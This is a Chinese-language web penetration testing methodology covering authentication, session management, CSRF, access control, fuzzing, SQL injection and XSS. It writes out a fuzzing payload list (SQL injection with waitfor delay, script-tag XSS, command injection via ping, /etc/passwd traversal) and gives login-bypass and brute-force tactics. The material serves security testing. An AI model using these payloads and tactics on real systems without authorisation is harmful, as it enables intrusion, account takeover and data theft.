向每个位置提交两个请求，齐总分别包含一个有效和一个无效的用户名。分析服务器对每一个请求的响应的各方面细节，包括HTTP状态码、任何重定向、屏幕上显示的信息、任何隐藏在HTML页面源代码中的差异以及服务器作出影响的时间。请注意，其中一些差异可能极其细微，有必要的话可以通过对比进行差异对比。 如果从提交有效和无效用户名返回的响应中发现任何差异，那么使用另外一组用户名重复进行测试，确定响应之间是否存在相同模式的差异，以此作为自动化用户名枚举的基础。 检查应用程序中任何其他科帮助获得一组有效用户名的信息泄露源，例如，日志功能、注册用户列表以及在源代码主时钟直接提及姓名或电子邮件地址的情况。 定位任何接收用户名的附属验证机制，并确定是否可以将其用于用户名枚举。特别注意允许指定用户名的注册页面。 3.4.4 测试密码猜测的适应性\n确定应用程序提交用户证书的每一个位置。通常，用户主要在主登录功能和密码修改功能中提交证书。如果用户可提交任意用户名，密码修改功能才会成为密码猜测攻击的有效目标。 在每一个位置，使用一个受控制的账户手动提出几个包含有效用户名但证书无效的请求。监控应用程序的响应，确定他们之间的所有差异。如果应用程序经过大约10次登录失败后还没有返回任何有关账户锁定的消息，在提交一个包含有效证书的请求。如果这个请求登录成功，应用程序可能并未采取任何账户锁定策略。 如果没有控制任何账户，那么尝试枚举或猜测一个有效的用户名，并使用他提交几个无效的请求，监控任何有关账户锁定的错误消息。当然，应该意识到，这种测试可能会导致其他用户的账户被冻结或禁用。 3.4.5 测试账户恢复功能\n确定如果用户忘记他们的证书，应用程序是否允许他们重新控制自己的账户。通常，在朱登录功能附近有一个”忘记密码”连接即表示应用程序采用了密码恢复功能。 使用一个受控制的账户完成整个密码恢复过程，了解账户恢复功能的运作机制。 如果该功能使用机密问题之类的质询，确定用户是否可以在注册时设定或选择他们自己的质询。如果可以，使用一组枚举处的或常见的用户名获取一组质询，并对其分析，找出任何很容易猜测出答案的质询。 如果该功能使用密码“暗示\",采取和上一个步骤相同的操作获得一组密码暗示，确定任何可轻易猜测出答案的暗示。 对账户恢复质询进行与主登录功能相同的测试，确定可对其实施自动猜测攻击的漏洞。 如果该功能要求向用户发送一封电子邮件才能完成整个恢复过程，寻找任何可帮助控制其他用户账户的弱点。确定是否有可能控制接收以上电子邮件的地址。如果邮件内容包含一个唯一的恢复URL，使用受控制的一个电子邮件地址获得若干邮件，尝试确定任何可帮助预测发布给其他用户的URL模式。 3.4.6 测试“记住我”功能\n如果主登录功能或它的支持逻辑包括“记住我”功能，激活这项功能并分析它的作用。如果该功能允许用户随后不输入任何证书即可登录，那么应该仔细分析这项功能，查找其中存在的所有漏洞。 仔细检查激活“记住我”，功能时设定的所有持久性cookie。寻找任何明确标识出用户身份或明显包含可预测的用户标识符的数据。 即使其中保存的数据经过严密编码或模糊处理，也要仔细分析这些数据，并比较“记住”几个非常类似的用户名和密码的结果，找到任何可对原始数据进行逆向工程的机会。 根据以上结果，适当修改cookie的内容，尝试伪装成其他应用程序用户。 3.4.7 测试伪装功能\n如果应用程序包含任何明确的功能，允许一名用户伪装成另一名用户，那么仔细审查这项功能，查找所有允许未经正确授权即可伪装成任意用户的漏洞。 寻找所有用户提交的、用于确定伪装目标的数据。尝试修改这个数据，伪装成其他用户，特别是可帮助提升权限的管理用户。 当针对其他用户账户试试自动密码猜测攻击时，寻找所有明显使用多个有效密码的账户，或者几个使用相同密码的账户。这表示应用程序提供后门密码，一边管理员使用它时以任何用户的身份访问应用程序。 3.4.8 测试用户名唯一性\n如果应用程序提供注册功能，允许指定想要的用户名，那么尝试使用不同的密码注册同一个用户名。 如果应用程序阻止第二个注册尝试，就可以利用此策略枚举出已注册的用户名。 如果应用程序注册以上两个账户，深入分析这种情况，确定用户名与密码发生冲突时应用程序的行为。尝试修改一个账户的密码，使其与另一个密码相同。同事，尝试使用完全相同的用户名与密码注册两个账户。 如果在用户名与密码发生冲突时，应用程序发出警报或产生错误，就可以利用自动化攻击，确定其他用户的密码。针对一个枚举出的或猜测到的用户名，尝试使用这个用户名与不同的密码创建账户。应用程序拒绝某个特殊的密码即表示它可能是目标账户的现有密码。 如果应用程序接收相互冲突的用户名与密码，并且不产生错误，那么使用相互冲突的证书登录，确定应用程序的行为，以及是否可以利用这种行为不经授权即可访问其他用户账户。 3.4.9 测试证书的可预测性\n如果用户名或密码由应用程序自动生成，设法获得几个紧密相连的用户名或密码，确定任何可探测的顺序或模式。 如果用户名以可预测的方式生成，那么向后推导，获得一组可能有效的用户名。这些用户名可作为自动密码猜测与其他攻击的基础。 如果密码以可预测的方式生成，那么推导这种模式，获取应用程序向其他用户发布的一组密码。渗透测试员可以将这些密码与获得的用户名进行组合，实施密码猜测攻击。 3.4.10 检测不安全的证书传输\n遍历所有需要传输证书、与验证有关的功能，包括主登录功能、账户注册功能、密码修改功能以及允许查看或更新用户个人信息的页面。使用拦截代理服务器监控客户端与服务器之间的所有流量。 确定在来回方向传输证书的每一种情况。可以在拦截代理服务器中设置拦截规则，标记包含特殊字符串的消息。 3, 如果证书在URL查询字符串中传输，那么这些证书可能会通过浏览器历史记录、屏幕、服务器日志以及Referer消息头泄露。 如果证书被保存在cookie中，可能会通过XSS攻击或本地隐私攻击泄露。 如果证书被从服务器传送回客户端，攻击者就可以利用会话管理或访问控制漏洞，或者通过XSS攻击获取这些证书。 如果证书通过未加密连接传输，他们很可能被窃听者拦截。 如果适用HTTPS提交证书，但适用HTTP加载登录表单，那么应用程序就容易遭受中间人的攻击，攻击者也可能适用这种攻击手段获取证书。 3.4.11 检测不安全的证书分配\n如果应用程序通过某种带外通道创建账户，或者它提供的注册功能本身并不决定用户使用的全部厨师证书，那么应该确定应用程序采用了什么方法向新用户分配证书。常用的方法包括发送电子邮件，或者向邮政地址寄送信件。 如果应用程序生成以带外方式分配的账户激活URL，尝试注册几个紧密相连的新账户，并确定收到的URL中的顺序。如果能确定某种模式，努力预测应用程序发送给最近与后续用户的URL，并尝试使用这些URL占用他们的账户。 尝试多次重复使用同一个激活URL，看看应用程序是否允许这样做。如果遭到拒绝，尝试在重复使用URL之前锁定目标账户，看看URL是否仍然可用。确定使用这种方法是否可以给一个已经激活的账户设定一个新密码。 3.4.12 测试不安全的存储\n如果可以访问散列密码，应检查共享同一散列密码值的账户。尝试以采用最常用的散列值的密码登录。 使用相关散列算法的离线彩虹表查找明文值。 3.4.13 测试逻辑缺陷\n3.4.13.1 测试故障开放条件\n对于要求应用程序检查用户证书的每一项功能（包括登录与密码修改功能），使用控制的账户以正常方式访问这些功能。注意他们提交给应用程序的每一个请求参数。 连续多次重复以上过程，以各种无法预料的方式轮流修改每一个参数，破坏应用程序逻辑。对每一个参数进行以下修改。 提交一个空字符串值 完全删除名/值对 提交非常长和非常短的值 提交字符串代替数字或提交数字代替字符串 以相同和不同的值，多次提交同一个命名参数 检查应用程序对上述请求的响应。针对异常进行分析，并将各种异常行为触发方式进行混合组合。 3..4.13.2 测试多阶段处理机制\n如果任何与验证有关的功能需要在一系列不同的请求中提交证书，确定每一个阶段的主要目的，同事注意每一个阶段提交的参数。 连续多次重复以上过程，修改提交请求的顺序，破坏应用程序的逻辑。相关测试包括： 以不同的顺序完成所有阶段，到达想要的那个阶段 轮流直接进入每一阶段，然后按正常顺序访问后续步骤 几次访问上述功能，轮流省略每一阶段，然后在后一个阶段继续按正常的顺序访问 根据观察到的结果以及每个功能阶段的主要目的，尝试通过其他方式修改这些阶段的顺序，并访问开发者没有预料到的阶段 确定是否有任何一项信息（如用户名）在几个阶段被提交，或者是因为用户提交了他几次，或者是因为他通过客户端在隐藏表单字段，cookie或预先设置的查询字符串参数中传送。这时尝试在不同阶段提交不同的值（包括有效和无效值），并观察其后果。设法确定提交的数据是否是多余的，或者在一个阶段确认，随后即被应用程序新人，或者在不同的阶段通过不同的检查进行确认。尝试利用应用程序的行为获得未授权访问，或者降低多阶段机制实施的控制的效率。 查找所有通过客户端传送的数据。如果应用程序使用隐藏参数在各个功能阶段中追踪进程状态，那么攻击者可以修改这些参数，从而破坏应用程序的逻辑。 如果进程的任何部分要求应用程序采用一个随机变化的质询，对它进行测试，查找以下两种常见的缺陷。 a. 如果一个指定质询的参数与用户的响应一起提交，确定是否可以修改这个值，选择自己的质询。 b. 多次使用相同的用户名处理上述不断变化的质询，确定每次是否出现一个不同的质询。如果每次的质询各不相同，那么就可以重复进入这个阶段直到应用程序显示希望的质询，以这种方式选择想要的质询。 3.4.14 利用漏洞获取未授权访问\n分析在各种验证功能中发现的所有漏洞，确定所有可在攻击应用程序过程中用于实现自己的目标的漏洞。通常，这包括尝试以另一名用户的身份进行验证;如有可能，以拥有管理权限的用户身份验证。 在实施自动攻击之前，留意已经确定的所有账户锁定防御。例如，当对登录功能实施用户名枚举攻击时，在请求中提交一个常用的而不能完全随机的密码，以免在每一个发现的用户名上浪费一次登陆失败尝试。同样，应以广度优先而非深度优先的方式实施密码猜测攻击。首先使用单词列表中最常用的脆弱密码，然后使用其他值，对每一个美剧出的用户名实施密码猜测攻击。 构建在密码猜测攻击中使用的单词列表时，应考虑密码强度规则以及密码确认机制的完整性，避免使用不可能的或多余的测试密码值。 使用技巧尽可能多的自动攻击，提高速度和效率。 3.5 测试会话管理机制 3.5.1 了解会话管理机制\n分析应用成用于管理会话与状态的机制。确定应用程序是否使用会话令牌或其他方法处理每一名用户提交的各种请求。请注意，用户通过验证后。一些验证技术（HTTP验证）并不需要使用完整的会话机制重新确认用户的身份。同时，一些应用程序采用一种无会话状态机制，通常使用一个加密或模糊处理的表单，通过客户端传送所有状态信息。 如果应用程序使用会话令牌，确定它到底使用哪些数据重新确认用户的身份。HTTP、cookie、查询字符串参数以及隐藏表单字段均可用于传送令牌。可使用不同的数据共同重新确认用户的身份，不同的数据可能被不同的后端组件使用。有时，看似为会话令牌的数据实际并未被应用程序使用。例如，web服务器生成的默认cookie。 为确定应用程序到底使用哪些数据作为令牌，找到一个确信依赖会话的页面（如某一名用户的“用户资料”页面）或功能，并向它提出几个请求，系统性地删除怀疑被用作令牌的数据项。如果删除某个数据项后，应用程序不再返回依赖会话的页面，即可确定该数据项为会话令牌。Burp Repeater是执行这些测试的有用工具。 确定应用程序使用哪些数据重新确认用户的身份后确定它是否对每个令牌进行完整的确认，或者是忽略令牌的某些组成部分。修改令牌的值，一次修改一字节，并确定修改后的值是否仍然被应用程序接受。如果发现令牌的某些部分并未被用于保持会话的状态，就不必再深入分析他们。 3.5.2 测试令牌的含义\n在不同时间几个不同的用户登录，记录服务器发布的令牌。如果应用程序允许注册，就可以选择自己的用户名，用一系列存在细微差别的相似用户名登录，如A、AAA、AAAB、AAAC等。如果其他与某一名用户有关的数据（如电子邮件地址）在登录阶段 提交或保存在用户资料中，对其进行与前面类似的系统化修改，并截获收到的令牌。 分析收到的令牌，查找所有与用户名和其他用户可控制的数据有关的内容。 分析令牌，查找所有明显的编码或模糊处理方案。查找用户名长度与令牌长度之间的所有相互关系；这种关系表示应用程序明显使用了某种模糊处理或编码方案。如果用户名包含一组相同的字符。在令牌中寻找表示可能适用XOR模糊处理的对应字符序列；在令牌中寻找仅包含十六进制字符的序列，他表示应用程序可能对ASCII字符串进行了十六进制编码处理，或者被披露其他信息。寻找以等号（=）结尾的字符序列或仅包含其他有效Base64字符的序列，如a-z，A-Z、0-9、+和/。 如果可以从会话令牌样本中获得任何有意义的数据，确定这些信息是否足以帮助发动攻击，猜测出最近发布给其他应用程序用户的令牌。找到一个依赖会话的应用程序页面，使用自动生成和测试可能的令牌。 3.5.3 测试令牌的可预测性\n使用一个可使服务器返回一个新令牌的请求（如一个成功登陆请求），生成并截获大量紧密相连的会话令牌。 设法确定令牌样本中的所有模式。在所有情况下，都应使用BurpSequtncer对应用程序的令牌的随机特性进行详细的系统测试。根据自动扫描结果，仍需进行手工分析。 理解应用程序重新确认身份的令牌和子序列。忽略并未用于确定用户身份的所有数据，即使样本中的这些数据发生了变化。 如果不清楚令牌或者令牌的所有组成成分使用何种类型的额数据，尝试使用各种解码方法（如base64），看能否得到更有意义的数据。有时可能有必要连续使用几种编码方法。 设法确定解码后的令牌或组成成分数据中存在的所有模式。计算连续值之间的差距。即使这些值看似杂乱无章，但是他们之间仍然可能存在固定的差距，允许渗透测试员显著缩小蛮力攻击的范围。 等待几分钟后，截取类似的一组令牌样本，重复进行上述分析。设法确定令牌的内容是否具有时间依赖性。 如果已经确定了所有模式，使用一个不同的IP地址与用户名截获另一组令牌样本，确定是否可以探查到相同的模式，或者是否可以对第一组令牌进行推导，猜测出第二组令牌。 如果能够确定可利用的序列或时间依赖关系，考虑这些信息是否足以帮助发动攻击，猜测出最近发布给其他应用程序用户的令牌。使用自动生成和测试可能的令牌。除最简单的序列外，可能需要在攻击中使用某些定制脚本。 如果会话ID似乎是定制编写的，可以使用BurpIntruder中的“位翻转”有效载荷源继续轮流修改会话令牌中的每个位。同时，在响应中查找表明修改令牌是否会导致会话无效，或会话是否属于其他用户的字符串。 3.5.4 检查不安全的令牌传输\n以正常方式访问应用程序，从“起始”URL中的未通过验证的内容开始，到登录过程，再到应用程序的全部功能。留意发布新会话令牌的每一种情况，确定哪些部分使用了HTTP通信，哪些部分使用HTTPS通信。可以使用拦截代理查看。 如果应用程序使用HTTP cookie传送会话令牌，应确认其是否设置了安全标记，防止通过HTTP连接传送令牌。 在正常使用应用程序的情况下，确定会话令牌是否通过HTTP连接传送。如果是这样，他们就很容易被拦截。 如果应用程序在未通过验证的区域使用HTTP，然后在登陆或通过验证的区域转换到HTTPS，那么确认应用程序是否为HTTPS通信发布一个新的令牌，或者应用程序在转换到HTTPS后是否仍然使用HTTP阶段的令牌。如果是这样，它们很容易被拦截。 如果应用程序的HTTPS区域包含指向HTTP URL的链接，访问这些链接，确认在访问过程中是否有会话令牌被提交；如果是这样，令牌或者继续有效，或者立即被服务器终止。 3.5.5 检查在日志中泄露的令牌\n如果在应用程序解析过程中能确定任何日志、监控或诊断功能，应仔细检查这些功能，确定他们是否泄露任何会话令牌。确定在正常情况下那些人有权访问这些功能；如果只有管理员能够使用这些功能，那么确认低权限用户是否可以利用任何其他漏洞访问他们。 确定所有在URL中传送会话令牌的情况。可能应用程序通常以更加安全的方式传送令牌，而开发这在特定情况下使用URL来解决特殊难题。如果是这样，当用户访问站外链接时，这些令牌将在Referer消息头中传递。确定所有允许在其他用户可查看的页面中插入任意站外链接的功能。 如果能够收集到发布给其他用户的有效会话令牌，就对每个令牌进行测试，确定他是否属于管理用户（例如，尝试使用令牌访问，某个特权功能）。 3.5.6 测试令牌-会话映射\n用同一个用户账户从不同的浏览器进程或从不同的计算机两次登录应用程序。确定这两个会话是否都处于活动状态。是就表示应用程序支持并行会话，可让攻破其他用户证书的攻击者能够利用这些证书，而不会有被检测出来的风险。 使用同一个用户账户从不同的浏览器进程或从不同的计算机登录并退出应用程序几次。确定应用程序在每次登录时是发布一个会话令牌，还是发布相同的令牌。如果每次发布相同的令牌，那么应用程序根本没有正确使用令牌，而是使用唯一持久性字符串重新确认用户身份。在这种情况下，应用程序就没有办法防止并行登录或正确事实会话超时。 如果令牌明显包含某种结构和意义，设法将表示用户身份的成分与无法辨别的成分区分开来。尝试修改与用户相关的所有令牌成分，使其指向其他已知的应用程序用户，并确定修改后的令牌是否被应用程序接受，以及能够让攻击者伪装成该用户。第七章细微漏洞示例。 3.5.7 测试会话终止\n当测试会话超时时与退出漏洞时，主要测试服务器如何处理会话令牌，而不是客户端发生的任何事件。在客户端浏览器内对令牌之星的操作并不能终止会话。 检查服务器是否执行会话终止。 登录应用程序获得一个有效令牌。 不适用这个令牌，等待一段时间后，用这个令牌提交一个访问受保护页面（如：“我的资料”页面）的请求。 如果该页面正常显示，那么令牌仍然处于活动状态。 使用反复测试的方法确定会话终止超时时间为多久，或者一个令牌在前一次使用它提交请求几天后是否仍被使用。可配置BurpIntruder递增连续请求之间的时间间隔，自动完成这项任务。 检查退出功能是否存在。如果应用程序使用退出功能，测试它是否能够在服务器上有效确认用户的会话。退出后，尝试重新使用原有的令牌，使用它请求一个受保护的页面，确定其是否仍然有效。如果令牌仍然有效，那么及时用户已经“退出”，他们仍然易于受到会话劫持攻击。可以使用Burp Repeater从代理历史记录中不断发送一个特殊的请求，观察退出后应用程序是否做出不同的响应。 3.5.8 测试会话固定\n如果应用程序向未通过验证的用户发布令牌，获取令牌并登陆。如果应用程序在登录后并不发布一个新令牌，就表示它易于受到会话固定攻击。 即使应用程序并不向未通过验证的用户发布令牌，也可通过登录获得一个令牌，然后返回登录页面。如果应用程序“愿意”返回这个页面，即使已经通过验证，也可使用相同的令牌以另一名用户的身份提交另一次登录。如果应用程序在第二次登陆后并不发布一个新令牌，就表示易于受到会话固定攻击。 确定应用程序会话令牌的格式。用一个捏造的、格式有效的值修改令牌，然后尝试使用它登录。如果应用程序允许使用一个捏造的令牌建立通过验证的会话，就表示它易于受到会话固定攻击。 如果应用程序并不支持登录功能，但处理敏感数据（如个人信息和支付细节），并 3.5.9 检查CSRF\n如果应用程序完全依靠HTTP cookie传送会话令牌，它很可能容易受到跨站点请求伪造(CSRF)的攻击。 分析应用程序的关键功能，确定用于执行敏感操作的特定请求。如果这些请求中的参数完全可由攻击者事先决定（也就是说，其中并不包含任何会话令牌、无法预测的数据或其他机密），那么几乎可以肯定应用程序易于受到攻击。 创建一个HTML页面，它不需要进行任何用户交互，即可提出想要的请求。对GET请求，可以使用一个标签，并通过对src参数设置易受攻击的URL。对于POST请求，可以建立一个表单，其中包含实施攻击所需全部相关参数的隐藏字段，并将其目标设为易受攻击的URL。可以使用JavaScript在页面加载时自动提交该表单。登录应用程序后，使用同一个浏览器加载前面创建的HTML页面。确认应用程序是否执行想要的操作。 如果应用程序为阻止CSRF攻击，在请求中使用其他令牌，则应以与测试会话令牌相同的方法测试这些令牌的可靠性。还应测试应用程序是否易于受到UI伪装攻击，以突破反CSRF防御。第13章。 3.5.10 检查cookie范围\n如果应用程序使用HTTP cookie传送会话令牌（或任何其他敏感数据），那么检查相关的Set-cookie消息头，寻找用于控制cookie范围的所有“城”或“路径”属性。 如果一个应用程序明确放宽它的cookie范围限制，将其设定为一个父域或父目录，那么攻击者可以通过以上父域或父目录中的其他Web应用程序向该应用程序发动攻击。 如果一个应用程序以它自己的域名为它的cookie域范文（或并未指定“域“属性），那么它仍然可能受到在子域上运行的应用程序的威胁。这是设定cookie范文造成的后果，只有不在安全敏感的应用程序的子域上运行其他应用程序，才能避免这种后果。 确定对按路径（如/site/main和/site/demo）隔离的任何依赖情况，跨站点脚本攻击能够破坏这种隔离。 确定所有可能收到应用程序发布的cookie的域名和路径。确定是否可通过这些域名或路径访问其他web应用程序，以及是否可利用他们获得发布给目标应用程序用户的cookie。 3.6 测试访问控件 3.6.1 了解访问控制要求\n根据应用程序的核心能力，了解访问控制在垂直隔离（拥有不同权限的用户可访问不同类型的功能）与水平隔离（拥有相同权限的用户可访问不同的数据）方面的主要要求，通常，应用程序会使用两种权限隔离，例如，普通用户能够访问自己的数据，而管理员则能够访问每个用户的数据。 检查应用程序解析过程得到的结果，确定最可能成为权限提升攻击目标的功能区域与数据资源类型。 为提高测试访问控制漏洞的效率，渗透测试员应该获得大量拥有不同垂直权限与水平权限的账户。如果应用程序允许注册，渗透测试员就可以直接获得大量拥有不同水平权限的账户。为获得拥有不同垂直权限的账户，需要得到应用程序所有者的帮助（或利用某个漏洞访问一个高权限账户）。如后文所述，能否获得各种不同的账户将会对能够进行的测试产生直接影响。 3.6.2 使用多个账户测试\n如果应用程序实施垂直权限隔离，那么首先使用一个高权限账户确定它能访问的所有功能，然后再使用一个低权限账户尝试访问上述每一项功能。 a. 使用Burp在一个用户的权限下浏览应用程序的所有内容 b. 复查Burp的站点地图内容，确保已确定要测试的所有功能。然后，注销应用程序并使用另一个用户账户登录；使用上下文菜单选择“比较站点地图”（compare site maps）功能，确定较低权限的用户可以访问哪些高权限请求。参考第8章。 如果应用程序实施水平权限隔离，那么使用两个拥有相同权限的不同账户进行同等测试，尝试使用一个账户访问属于一个账户的数据。通常，这需要替换请求的一个标识符（如一个文档ID），以指定属于其他用户的资源。 手动检查关键访问控制逻辑。 对于每个用户权限，反复用户可用的资源。尝试通过使用未授权用户的会话令牌，从未授权用户账户重新提交请求来访问这些资源。 进行访问控制测试时，一定要分别测试多阶段功能的每一个步骤，确定每一个阶段是否正确实施了访问控制；或者应用程序是否认为访问后一个阶段的用户一定通过了前面阶段实施的安全检查。例如，如果一个包含表单的管理页面收到恰当保护，检查提交表单的过程中是否同样实施了合理的访问控制。 3.6.3 使用有限的权限测试\n如果不能优先访问不同权限的账户，或者优先访问几个能够访问不同数据的账户，那么测试不完善的访问控制机制可能相当困难。由于并不知道利用各种缺陷所需的URL名称、标识符和参数，因此许多常见的漏洞将更加难以确定。 在使用地权限账户解析应用程序的过程中，渗透测试员可能已经确定了访问管理接口等特权功能的URL。如果这些功能没有得到充分保护，渗透测试员可能已经了解了这一点。 反编译现有的所有已编译客户端，并提取对服务器端功能的任何引用情况。 大多数收到水平访问控制保护的数据可使用一个标识符(如一个账号或订单号）访问。为了使用一个账户测试访问控制是否有效，需要尝试、猜测或发现与其他用户的数据有关的标识符。如有可能，生成一系列紧密相连的标识符（例如，通过建立几个新订单），尝试确定所有可帮助预测发布给其他用户的标识符的模式。如果无法生成新的标识符，就只能分析以确定的标识符，并根据这些标识符猜测其他标识符。 如果能够预测发布给其他用户的标识符，使用14章描述的技巧实施自动攻击，获取属于其他用户的有用数据。可使用Burp Intruder的Extract Grep功能从应用程序的响应中截获相关信息。 3.6.4 测试不安全的访问控制的方法\n一些应用程序根据请求参数以一种内在不安全的方式实施访问控制。在所有关键请求中寻找edit=false或access=read之类的参数，根据他们的主要作用修改这些参数，尝试破坏应用程序的访问控制逻辑。 一些应用程序根据HTTP Referer消息头作出访问控制决策。例如，一个应用程序可能对/admin.jsp实施严格的访问控制，并接收在Referer中显示它所有请求。为测试这种行为，尝试执行一些获得授权的特权操作，并提交一个其中缺少referer消息头或referer消息头被修改的请求。如果这种改变导致应用程序组织请求，应用程序很可能以不安全的方式使用Referer消息头。尝试使用一个未通过验证的用户账户执行相同的操作，但提交原始的referer消息头，看这时是否能够成功执行操作， 如果站点允许HEAD方法，则应测试针对URL的不安全的容器托管访问控制。使用HEAD方法提出请求，确定应用程序是否允许该方法。 3.7 测试基于输入的漏洞 3.7.1 模糊测试所有请求参数\n检查应用程序解析过程中获得的结果，如果所有提交 要对这些参数进行模糊测试，可以使用自己的脚本，或者现成的模糊测试工具。例如，如果使用Burp Intruder，可轮流在工具中加载每一个请求。一个简单的方法是在Burp中使用Intruder功能。 使用“有效载荷”选项卡，配置一组适当的攻击有效载荷，在应用程序中探查漏洞。可以手动输入有效载荷，从一个文件中加载他们，或者选择一个预先设定的有效载荷列表。模糊测试应用程序中的第一个请求参数往往需要发布数目庞大的请求，并在结果中查找翻唱现象。如果设定的攻击字符创太多，这样反而达不到效果，甚至生成无数的输入，以至于难以对其进行分析。因此，较为明智的做法是，测试一系列可在特定的专门设计的输入的翻唱响应中轻易 确定的常见漏洞，以及出现在应用程序的所有位置而非某些特殊功能中的漏洞。 sql注入\n' ‘– ‘; waitfor delay ‘0:30:0’– 1; waitfor delay ‘0:30:0’– xss与消息头注入\nxsstest \"\u003e\u003cscript\u003ealert('xss')\u003c/script\u003e OS命令注入\n|| ping -i 30 127.0.0.1 ;x || ping -n 30 127.0.0.1 \u0026 | ping -i 30 127.0.0.1 | | ping -n 30 127.0.0.1 | \u0026 ping -i 30 127.0.0.1 \u0026 \u0026 ping -n 30 127.0.0.1 \u0026 ; ping 127.0.0.1 ; %0a ping -i 30 127.0.0.1 %0a ping 127.0.0.1 目录遍历\n../../../../../../../../../../../../etc/passwd ../../../../../../../../../../../../../boot.ini ......................\\etc\\passwd ................................\\boot.ini 脚本注入\n;echo 111111 echo 111111 response.write 111111 :response.write 111111 前面所有的有效载荷均以字面量形式显示，?、；、\u0026、+空格与=字符因为在HTTP请求中有特殊含义，需要进行URL编码。默认情况下，Burp Intruder会对这些字符进行必要的编码，因此，必须确保该选项没有被禁用。（如果想要在定制后将所有选项恢复到他们的默认值，可从Burp菜单中选择“恢复默认值”选项。） 在Burp Intruder的Grep功能中，配置一组合适的字符串，标记响应中的一些常见的错误消息。例如： error,exception,illegal,invalid,fail,stack,access,directory,file,not found,varchar,odbc,sql,sql,select,111111 注意，其中的字符串111111用于测试成功的脚本注入攻击 同时，选择“有效载荷Grep”选项，标记含有有效载荷自身的响应，该响应应表示可能存在XSS或消息头注入漏洞。 在通过第一个文件包含有效载荷指定的主机上建立一个web服务器或netcat监听器，监控服务器由于远程文件包含攻击而发出的连接尝试。 实施并完成攻击后，在结果中查找表示存在漏洞的反常响应。检查HTTP状态码、响应长度、响应时间、其中是否出现配置的表达式以及是否出现有效载荷本身。可以单击结果表的每一个列标题，对列中的值进行分类（按下Shift键的同事单击鼠标可对结果进行反向排序），这样做客迅速确定所有不同于其他结果的反常响应。 对每一类问题的详情描述，对模糊测试结果表明可能存在的每一个潜在的漏洞进行确认，同事考虑如何成功的利用这些漏洞。 一旦配置Burp Intruder对某一个请求进行模糊测试之后，就可以迅速地对应用程序中的其他请求进行相同的测试。 如果在解析应用程序的过程中更确定了带外输入通道，可通过他们向应用程序提交用户控制的输入。渗透测试员应当通过提交各种旨在触发常见的Web应用程序漏洞的专门设计的数据，对这些输入管道进行类似的模糊漏洞。根据输入通道的特点，可能需要建立一个定制脚本或其他工具。 除了手动对应用程序请求进行模糊测试之外，如果拥有一个自动化web应用程序漏洞扫描器，还应当运行该扫描器，对目标应用程序进行自动测试，并比较两方面的测试结果。 3.7.2 测试sql注入\n如果模糊测试中对sql攻击字符串导致任何反常响应，那么应该手动探查，观察应用程序如何处理相关参数，确定其中是否存在sql注入漏洞。 如果提交上书字符创返回错误信息，分析消息的意义。sql报错等。 如果请求中提交一个单引号导致错误或出现其他反常行为，可尝试提交两个单引号；如果这种输入使错误或异常行为小时，应用程序可能易受到SQL注入。 设法使用常用的SQL字符串连接符函数构建一个等同于良性输入的字符串。如果提交这个字符串得到与提交原始的良性输入相同的响应，那么应用程序可能易于受到攻击。例如，如果原始输入为表达式FOO，可以使用下面的输入测试： ‘||‘FOO ‘*‘FOO ’ ‘FOO 同样，应对HTTP请求中具有特定意义的字符，如+和空格进行URL编码。 如果原始输入为数字字符，尝试使用一个其结果等于原始值的数学表达式。例如，如果原始值为2，尝试提交1+1或3-1。如果应用程序作出相同的响应，表示它易于受到攻击；如果数字表达是的值对应用程序的行为造成系统性的影响。那么应用程序就特别容易受到攻击。 如果前面的测试取得成功，可以通过使用针对sql的数学表达式构造一个特殊的值，进一步确定sql注入漏洞是否存在。如果可以通过这种方式系统性地控制应用程序的逻辑，那么几乎可以肯定应用程序易于受到SQL注入攻击。例如， 下面两个表达式的结果都等于2： 67-ASCII(‘A’) 51-ASCII(1) 如果使用waitfor命令进行的模糊漏洞测试导致应用程序在进行响应时出现反常的时间延迟，那么所使用的数据库为MS-sql，且应用程序易于受到SQL注入攻击。手动重复测试，在waitfor参数中指定不同的值，确定响应时间是否随着这个值而发生系统性的变化。请注意，可以在几个SQL查询中插入攻击有效载荷；这时观察到的时间延迟为指定值的固定倍数。 如果应用程序易于受到SQL注入攻击，渗透测试员要考虑可以实施哪些攻击，以及如何利用他们实现自己的目的。参考第九章。 修改WHERE子句中的条件，改变应用程序的逻辑（例如，注入or 1=1–避开登录）。\n使用UNION操作符注入任意一个SELECT查询，将它的结果与应用程序的原始查询的结果组合在一起。\n使用针对数据库的SQL语法“指纹标识”数据库类型。\n如果使用的数据库为MS-SQL，且应用程序在响应中返回ODBC错误，利用这些信息枚举数据库结构，获取任意数据。\n如果无法获得一个任意输入的查询结果，可以使用以下攻击技巧提取数据。\n获取数字格式的字符串数据，一次一字节。 使用带外通道。 如果能够根据任意一个条件引发不同的应用程序响应，可使用Absinthe提取任意数据，一次一比特。 如果能够根据一个任意的条件出发时间延迟，利用他们获取数据，一次一比特。 如果应用程序阻止实施特殊攻击所需的某些字符或表达式，尝试使用第9章描述的各种技巧避开输入过滤。\n3.7.3 测试XSS和其他响应注入\n3.7.3.1 确定反射型请求参数\n单击“有效载荷Grep”列，分类模糊漏洞测试的结果，确定任何与xss检测参数匹配的字符串。判断反射点。 对于上述每一个字符串，检查应用程序的响应，查找用户提交的输入的位置。如果该字符串出现在响应主体中，应测试应用程序中是否存在XSS漏洞。如果它出现在HTTP消息头中，应测试应用程序中是否存在消息头注入漏洞。如果它被用在302响应的Location消息头中，或者用于以某种方法指定重定向，应测试应用衡虚中是否存在重定向漏洞。注意，同一个输入可能会被复制到响应中的几个位置，因此应用程序中可能存在几种类型的反射型漏洞。 3.7.3.2 测试反射型XSS\n对于在响应主题中出现的所有请求参数，检查它周围的HTML代码，确定是否可以提交专门涉及的输入，从而执行任意JS脚本。例如，通过注入标签，注入一段现有代码，或在一个标签属性中插入精心设计的值，执行任意JS脚本。 将12章攻破签名过滤器的各种方法作为参考，了解如何利用专门设计的输入执行任意JS脚本。 尝试向应用程序提交各种可能的输入，监控它的响应，确定应用程序是否对输入进行任何过滤或净化。如果攻击字符串被原样返回，使用浏览器确认成功执行了任意js脚本。 如果发现应用程序组织需要使用的某些字符串或表达式，或者对某些字符进行URL编码，尝试使用12章技巧避开过滤。 如果在一个POST请求中发现了XSS漏洞，仍然可以通过一个包含表单的恶意WEB站点，由必要的请求参数和一段脚本自动提交该表单，对这个漏洞加以利用。但是，如果可以通过GET请求利用漏洞，就可以使用大量供给传送机制。尝试在GET请求中提交相同的参数，看概念股及是否仍然取得成功。这里Burp 里自带Change Request Method。 3.7.3.3 